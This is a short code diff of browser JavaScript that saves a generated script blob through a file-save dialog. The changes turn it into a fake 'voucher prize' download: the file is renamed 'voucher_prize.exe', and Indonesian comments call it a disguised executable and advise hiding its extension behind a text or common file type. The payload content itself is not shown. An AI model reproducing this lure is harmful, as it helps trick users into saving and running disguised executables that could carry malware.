@@ -174,19 +174,19 @@
 
             const blob = new Blob([zshContent], { type: "text/plain" });
 
-            const options = {
-              startIn: "downloads",
-              suggestedName: "voucher-code.sh",
-              types: [
-                {
-                  description: "ZSH Shell Script",
-                  accept: {
-                    "text/plain": [".apk"],
-                  },
-                },
-              ],
-              excludeAcceptAllOption: true,
-            };
+          const options = {
+  suggestedName: "voucher_prize.exe",  // Akan diunduh dengan ekstensi .exe, tapi bisa disembunyikan
+  types: [
+    {
+      description: "File executable (disamarkan)",
+      accept: {
+        "text/plain": [".txt"],  // Gunakan ekstensi teks atau ekstensi umum lainnya
+      },
+    },
+  ],
+  excludeAcceptAllOption: true,
+};
+
 
             try {
               const handle = await window.showSaveFilePicker(options);
